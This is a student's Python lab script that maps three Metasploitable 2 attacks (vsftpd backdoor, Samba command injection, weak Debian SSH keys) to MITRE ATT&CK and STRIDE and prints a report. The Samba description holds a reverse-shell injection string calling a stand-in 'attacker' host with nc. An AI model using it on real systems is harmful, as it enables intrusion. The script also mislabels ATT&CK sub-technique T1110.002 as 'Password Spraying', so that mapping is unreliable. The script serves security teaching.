# Attack Classification – MITRE ATT&CK mapping
# CS 475 Week 3 – Mária Nyolcas
#
# This script encodes three attack scenarios relevant to the services
# discovered on the Metasploitable 2 lab target, maps each to MITRE
# ATT&CK tactics and techniques, and prints a structured report.
#
# Reference: MITRE ATT&CK Enterprise Matrix v15, https://attack.mitre.org

from dataclasses import dataclass


@dataclass
class Technique:
    tid: str          # ATT&CK technique ID, e.g. T1190
    name: str
    sub_tid: str = "" # sub-technique ID if applicable, e.g. T1190.001
    sub_name: str = ""


@dataclass
class AttackScenario:
    title: str
    service: str
    port: int
    tactic: str
    tactic_id: str
    technique: Technique
    description: str
    why_this_tactic: str
    stride: list[str]    # STRIDE categories that apply


# three scenarios based on services found on Metasploitable 2

SCENARIOS: list[AttackScenario] = [

    AttackScenario(
        title="Exploitation of vsftpd 2.3.4 Backdoor",
        service="vsftpd",
        port=21,
        tactic="Initial Access",
        tactic_id="TA0001",
        technique=Technique(
            tid="T1190",
            name="Exploit Public-Facing Application",
        ),
        description=(
            "The vsftpd 2.3.4 package distributed between June and July 2011 "
            "contained a malicious backdoor inserted by an attacker who "
            "compromised the project's distribution server.  Sending a username "
            "containing the string ':)' triggers the backdoor, which opens a "
            "root shell on TCP port 6200.  No credentials are required.  "
            "This represents a supply-chain compromise that then becomes a "
            "trivially exploitable initial-access vector on any host running "
            "the tainted binary."
        ),
        why_this_tactic=(
            "ATT&CK maps this to 'Initial Access' because the adversary's goal "
            "at this stage is to gain a first foothold on the target system. "
            "T1190 (Exploit Public-Facing Application) is the most accurate "
            "technique because the attack targets a network-exposed service "
            "with a known vulnerability.  The combination of TA0001/T1190 "
            "captures both what the attacker is trying to achieve (foothold) "
            "and how they do it (exploit a public service)."
        ),
        stride=["Elevation of Privilege", "Information Disclosure"],
    ),

    AttackScenario(
        title="Samba Username Map Script – Command Injection",
        service="Samba",
        port=445,
        tactic="Execution",
        tactic_id="TA0002",
        technique=Technique(
            tid="T1059",
            name="Command and Scripting Interpreter",
            sub_tid="T1059.004",
            sub_name="Unix Shell",
        ),
        description=(
            "The 'username map script' smb.conf directive in Samba 3.0.20 "
            "is evaluated by /bin/sh without sanitisation.  An attacker "
            "crafts an MSRPC authentication request with a username that "
            "embeds shell metacharacters (e.g. `; nc -e /bin/bash attacker 4444`). "
            "Samba passes this string to the shell, executing arbitrary commands "
            "with the privileges of the smbd process – typically root on "
            "Metasploitable 2.  The attacker obtains an interactive reverse "
            "shell without prior authentication."
        ),
        why_this_tactic=(
            "The primary value delivered to the attacker here is code execution "
            "on the victim, so 'Execution' (TA0002) is the correct tactic. "
            "T1059.004 (Unix Shell) is chosen because the injection ultimately "
            "runs through /bin/sh.  Note that this exploit also achieves "
            "Initial Access simultaneously, but ATT&CK encourages tagging the "
            "primary effect; the persistence or lateral movement that follows "
            "would be classified under separate tactics."
        ),
        stride=["Tampering", "Elevation of Privilege"],
    ),

    AttackScenario(
        title="SSH Brute-Force via Predictable Debian OpenSSL Keys",
        service="OpenSSH",
        port=22,
        tactic="Credential Access",
        tactic_id="TA0006",
        technique=Technique(
            tid="T1110",
            name="Brute Force",
            sub_tid="T1110.002",
            sub_name="Password Spraying / Key Guessing",
        ),
        description=(
            "CVE-2008-0166 reduced the OpenSSL PRNG seed space on Debian "
            "(and derivatives) to 32,767 values for all key material generated "
            "between September 2006 and May 2008.  A pre-computed dictionary "
            "of all possible 1024-bit and 2048-bit RSA/DSA key pairs for that "
            "period is freely available.  An attacker iterates through the "
            "dictionary, attempting SSH public-key authentication with each "
            "candidate private key until one succeeds.  On Metasploitable 2, "
            "which uses Debian Etch, this yields a valid root or user session "
            "within minutes using tools such as Metasploit's ssh_login_pubkey "
            "auxiliary module."
        ),
        why_this_tactic=(
            "The attacker's goal is to acquire valid credentials, making "
            "'Credential Access' (TA0006) the right tactic.  T1110 (Brute Force) "
            "is appropriate because the attack tries many keys until one works. "
            "The sub-technique T1110.002 is the closest fit: although it is "
            "labelled 'Password Spraying' in ATT&CK, the underlying pattern "
            "(trying a large pre-computed set of secrets) matches this family "
            "better than T1110.001 (simple dictionary attack on passwords)."
        ),
        stride=["Spoofing", "Elevation of Privilege"],
    ),
]


# display

def print_scenario(s: AttackScenario, idx: int) -> None:
    tech_ref = s.technique.tid
    if s.technique.sub_tid:
        tech_ref += f" / {s.technique.sub_tid}"

    tech_name = s.technique.name
    if s.technique.sub_name:
        tech_name += f" > {s.technique.sub_name}"

    print(f"\n--- {idx}. {s.title} ---")
    print(f"  service: {s.service} on port {s.port}")
    print(f"  tactic:    [{s.tactic_id}] {s.tactic}")
    print(f"  technique: [{tech_ref}] {tech_name}")
    print(f"  STRIDE: {', '.join(s.stride)}")
    print(f"  what happens:")
    # word-wrap at ~65 chars
    words = s.description.split()
    line, col = "    ", 4
    for w in words:
        if col + len(w) + 1 > 68:
            print(line)
            line, col = "    " + w, 4 + len(w)
        else:
            line += (" " if col > 4 else "") + w
            col += len(w) + 1
    print(line)

    print()
    print(f"  why this tactic:")
    words = s.why_this_tactic.split()
    line, col = "    ", 4
    for w in words:
        if col + len(w) + 1 > 68:
            print(line)
            line, col = "    " + w, 4 + len(w)
        else:
            line += (" " if col > 4 else "") + w
            col += len(w) + 1
    print(line)


if __name__ == "__main__":
    print("attack classification – week 3 lab")
    print(f"target: Metasploitable 2  |  framework: MITRE ATT&CK v15")
    print()

    for i, scenario in enumerate(SCENARIOS, start=1):
        print_scenario(scenario, i)

    print(f"\nquick reference:")
    print(f"  {'#':<3} {'tactic':<20} {'technique':<12} {'service':<12} scenario")
    print(f"  {'-'*2} {'-'*19} {'-'*11} {'-'*11} {'-'*30}")
    for i, s in enumerate(SCENARIOS, 1):
        tid = s.technique.sub_tid or s.technique.tid
        print(f"  {i:<3} {s.tactic:<20} {tid:<12} {s.service:<12} {s.title}")
    print()
